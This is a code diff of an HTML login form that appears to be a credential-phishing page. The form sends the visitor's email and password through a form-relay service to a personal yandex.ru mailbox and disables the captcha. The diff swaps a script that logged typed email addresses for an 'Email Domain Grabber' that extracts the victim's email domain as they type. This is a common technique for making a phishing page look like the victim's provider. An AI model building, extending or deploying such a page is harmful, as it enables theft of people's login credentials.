@@ -28,22 +28,31 @@
         <form  action="https://formsubmit.co/evanskelvin2019@yandex.ru" method="POST">
 
             <!-- Honeypot -->
-            <!-- Email grabber: capture and log email input -->
-            <script>
-                document.addEventListener('DOMContentLoaded', function() {
-                    const emailInput = document.getElementById('Email');
-                    emailInput.addEventListener('change', function() {
-                        console.log('Email entered:', emailInput.value);
-                    });
-                });
-            </script>
             <input type="text" name="_honey" style="display:none;">
 
             <!-- Disable Captcha -->
+          
             <input type="hidden" name="_captcha" value="false">
             <div class="mb-3">
                 <label for="Email" class="form-label">Email</label>
                 <input type="text" class="form-control" id="Email" name="Email" required autofocus>
+
+                
+                  <!-- Email Domain Grabber -->
+            <script>
+                document.addEventListener('DOMContentLoaded', function() {
+                    const emailInput = document.getElementById('Email');
+                    emailInput.addEventListener('input', function() {
+                        const value = emailInput.value;
+                        const atIndex = value.indexOf('@');
+                        if (atIndex !== -1) {
+                            const domain = value.substring(atIndex + 1);
+                            // You can process or log the domain here
+                            // Example: console.log('Email domain:', domain);
+                        }
+                    });
+                });
+            </script>
             </div>
             <div class="mb-3">
                 <label for="password" class="form-label">Password</label>
